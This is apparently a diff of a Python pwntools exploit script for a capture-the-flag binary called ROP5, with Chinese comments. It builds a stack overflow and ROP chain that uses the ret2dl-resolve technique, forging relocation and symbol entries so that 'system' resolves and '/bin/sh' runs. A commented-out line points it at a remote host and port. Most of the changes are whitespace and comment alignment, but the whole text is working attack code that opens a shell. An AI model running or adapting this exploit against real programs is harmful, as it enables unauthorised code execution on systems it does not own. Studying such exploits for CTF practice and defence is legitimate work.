@@ -226,11 +226,14 @@ offset = 72
 read_plt = elf.plt['read']
 
 ppp_ret = 0x080485d9 				# ROPgadget --binary ROP5 --only "pop|ret" #esi edi ebp 
+
 pop_ebp_ret = 0x080485db
 leave_ret = 0x08048458 				# ROPgadget --binary ROP5 --only "leave|ret"
 
+
 cmd = "/bin/sh"
 plt_0 = 0x08048380 				# objdump -d -j .plt ROP5
+
 rel_plt = 0x08048330 				# objdump -s -j .rel.plt ROP5
 
 stack_size = 0x200
@@ -240,9 +243,11 @@ base_stage = bss_addr + stack_size
 puts_got = elf.got['puts'] 
 
 dynsym = 0x080481d8 				#objdump -d -j .dynsym ROP5
+
 dynstr = 0x08048278 				#objdump -d -j .dynstr ROP5
 
 #################################################
+
 index_offset = (base_stage + 28) - rel_plt
 fake_sym_addr = base_stage + 36
 align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
@@ -252,8 +257,10 @@ index_dynsym = (fake_sym_addr - dynsym) / 0x10
 
 versym = elf.dynamic_value_by_tag("DT_VERSYM")
 
-while True:																					#通过改变base_stage的方式来调整偏移，让ndx为0
-	fake_ndx = u16(elf.read(versym+index_dynsym*2,2)) #ndx定义时与0x7fff按位与运算，故ndx应该为两个字节
+while True:							#通过改变base_stage的方式来调整偏移，让ndx为0
+	
+	fake_ndx = u16(elf.read(versym+index_dynsym*2,2)) 	#ndx定义时与0x7fff按位与运算，故ndx应该为两个字节
+	
 	if fake_ndx != 0:
 		base_stage += 0x10
 		#################################################
@@ -262,6 +269,7 @@ while True:																					#通过改变base_stage的方式来调整偏移�
 		fake_sym_addr = fake_sym_addr + align
 		index_dynsym = (fake_sym_addr - dynsym) / 0x10
 		#################################################
+		
 		continue
 	else :
 		break 
@@ -269,12 +277,14 @@ while True:																					#通过改变base_stage的方式来调整偏移�
 
 r = process('./ROP5')
 #r  = remote("47.103.214.163", 20700)
+
 #gdb.attach(r,'b *0x0804855B')
 
 
 r.recvuntil('Are you the LEVEL5?\n')
 payload = 'A' * offset
-payload += p32(read_plt) 					# 读100个字节到base_stage
+payload += p32(read_plt) 				# 读100个字节到base_stage
+
 payload += p32(ppp_ret)
 payload += p32(0)
 payload += p32(base_stage)
@@ -287,11 +297,12 @@ r.send(payload)
 
 
 r_info = (index_dynsym << 8) | 0x7 			#readelf -r ROP5
+
 fake_reloc = p32(puts_got) + p32(r_info) 
 
 st_name = (fake_sym_addr + 0x10) - dynstr
-fake_sym = p32(st_name) + p32(0) + p32(0) + p8(0x12) + p8(0) + p16(0)
-																				#p8(0) 绕过判断(sym->st_other)&0x03是否为0
+fake_sym = p32(st_name) + p32(0) + p32(0) + p8(0x12) + p8(0) + p16(0) 		#p8(0) 绕过判断(sym->st_other)&0x03是否为0
+
 payload2 = 'AAAA'
 payload2 += p32(plt_0)
 payload2 += p32(index_offset)
@@ -299,9 +310,9 @@ payload2 += 'AAAA'
 payload2 += p32(base_stage + 80) 
 payload2 += 'aaaa'
 payload2 += 'aaaa'
-payload2 += fake_reloc 									# (base_stage+28)的位置
+payload2 += fake_reloc 								# (base_stage+28)的位置
 payload2 += 'B' * align
-payload2 += fake_sym 										# (base_stage+36)的位置
+payload2 += fake_sym 								# (base_stage+36)的位置
 payload2 += "system\x00"
 payload2 += 'C' * (80 - len(payload2))
 payload2 += cmd + '\x00'
